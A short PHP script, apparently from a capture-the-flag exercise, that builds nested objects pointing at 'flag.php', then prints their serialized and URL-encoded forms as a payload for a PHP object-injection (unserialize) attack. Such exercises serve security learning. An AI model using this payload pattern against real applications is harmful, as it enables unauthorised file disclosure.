<?php

class DemoX{
    protected $user;
    protected $sex;
	function __construct(){
		$this->user = new Demo2("flag.php");
	   // $this->user = "dd";
        $this->sex = "xxx";
	}
}

class Demo2{
    private $fffl4g;

	function __construct($file){
		$this->fffl4g = $file;
	}

}

$user = new DemoX();
$user = serialize($user);
echo $user . "<hr>";
echo urlencode($user);